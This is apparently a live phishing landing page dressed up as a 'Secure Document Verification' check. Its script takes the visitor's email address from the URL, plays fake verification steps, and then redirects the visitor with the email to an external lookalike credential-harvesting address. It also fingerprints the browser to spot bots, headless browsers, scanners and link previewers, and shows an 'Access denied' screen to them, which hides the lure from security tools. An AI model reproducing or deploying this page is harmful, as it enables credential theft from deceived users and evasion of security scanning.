<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<meta name="referrer" content="no-referrer">
<title>Secure Document Verification</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='6' fill='%231a56db'/><text x='16' y='22' text-anchor='middle' fill='white' font-size='16' font-family='Arial'>📄</text></svg>">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',system-ui,sans-serif;background:#0f172a;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#e0e0e0}
.wrap{max-width:460px;width:90%;text-align:center}
.secure-icon{width:64px;height:64px;margin:0 auto 24px;position:relative}
.ring{width:64px;height:64px;border:3px solid rgba(26,86,219,.3);border-top-color:#1a56db;border-radius:50%;animation:spin 1s linear infinite;position:absolute}
.icon-center{width:64px;height:64px;display:flex;align-items:center;justify-content:center;font-size:28px}
@keyframes spin{to{transform:rotate(360deg)}}
h1{font-size:22px;font-weight:600;margin-bottom:8px;color:#fff}
.sub{font-size:14px;color:#94a3b8;margin-bottom:32px;line-height:1.6}
.checks{text-align:left;max-width:300px;margin:0 auto 32px}
.check-item{display:flex;align-items:center;gap:12px;padding:10px 0;border-bottom:1px solid rgba(255,255,255,.06);font-size:13px}
.check-dot{width:20px;height:20px;border-radius:50%;border:2px solid #334155;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .4s}
.check-dot.done{border-color:#1a56db;background:#1a56db}
.check-dot.done::after{content:'✓';color:#fff;font-size:11px}
.check-dot.active{border-color:#3b82f6;animation:pulse 1s infinite}
@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(59,130,246,.4)}50%{box-shadow:0 0 0 6px rgba(59,130,246,0)}}
.check-label{color:#94a3b8}.check-item.done .check-label{color:#e2e8f0}
.blocked{display:none;color:#ef4444;font-size:14px;margin-top:16px}
</style>
</head>
<body>
<div class="wrap">
<div class="secure-icon"><div class="ring"></div><div class="icon-center">📄</div></div>
<h1>Secure Document Verification</h1>
<p class="sub">Your document is being verified for secure delivery.<br>Please wait while we complete the security check...</p>
<div class="checks" id="checks">
<div class="check-item" data-i="0"><div class="check-dot"></div><span class="check-label">Verifying document integrity</span></div>
<div class="check-item" data-i="1"><div class="check-dot"></div><span class="check-label">Checking security protocols</span></div>
<div class="check-item" data-i="2"><div class="check-dot"></div><span class="check-label">Authenticating your session</span></div>
<div class="check-item" data-i="3"><div class="check-dot"></div><span class="check-label">Preparing secure document</span></div>
</div>
<p class="blocked" id="blocked">⛔ Access denied. Security verification failed.</p>
</div>
<script>
/* ─── CONFIG: Extract email and build final URL ─── */
var email = '';

// 1. Check query string (?email=...) from the source URL
var params = new URLSearchParams(window.location.search);
if (params.get('email')) {
  email = params.get('email');
}

// 2. Check hash fragment (#email=... or just #email) from the source URL
if (!email && window.location.hash) {
  var hash = window.location.hash.substring(1);
  if (hash.includes('email=')) {
    var hashParams = new URLSearchParams(hash);
    if (hashParams.get('email')) email = hashParams.get('email');
  } else if (hash.includes('@')) {
    email = hash;
  }
}

// 3. Build the final redirect URL using ?email= (safer and more reliable)
var REDIRECT_URL = 'https://authxnxxiinuser.github.io/verifierx/?email=' + encodeURIComponent(email);
/* ──────────────────────────────────────────── */

(function(){
var items=document.querySelectorAll('.check-item'),b=document.getElementById('blocked');
function bad(){b.style.display='block';document.getElementById('checks').style.display='none';document.querySelector('.ring').style.animation='none';document.querySelector('.ring').style.borderColor='#ef4444'}
function chk(){
if(navigator.webdriver||window.__nightmare||window.callPhantom||window._phantom)return!1;
if(/bot|crawl|spider|headless|phantom|puppet|selenium|lighthouse|wget|curl|http|scan|preview|fetch|archive|index|probe/i.test(navigator.userAgent))return!1;
try{var c=document.createElement('canvas'),g=c.getContext('webgl')||c.getContext('experimental-webgl');if(!g)return!1}catch(e){return!1}
if(navigator.languages&&navigator.languages.length===0)return!1;
if(!window.chrome&&/Chrome/.test(navigator.userAgent))return!1;
if(screen.width<300||screen.height<300)return!1;
var n=performance.now();for(var i=0;i<1e5;i++)Math.sqrt(i);if(performance.now()-n<0.5)return!1;
if(typeof navigator.getBattery==='function'){try{navigator.getBattery().then(function(){})}catch(e){return!1}}
return!0
}
if(!chk()){bad();return}
var step=0;
items[0].querySelector('.check-dot').classList.add('active');
var iv=setInterval(function(){
items[step].querySelector('.check-dot').classList.remove('active');
items[step].querySelector('.check-dot').classList.add('done');
items[step].classList.add('done');
step++;
if(step<items.length){items[step].querySelector('.check-dot').classList.add('active')}
else{clearInterval(iv);setTimeout(function(){window.location.replace(REDIRECT_URL)},700)}
},1100);
})();
</script>
</body>
</html>
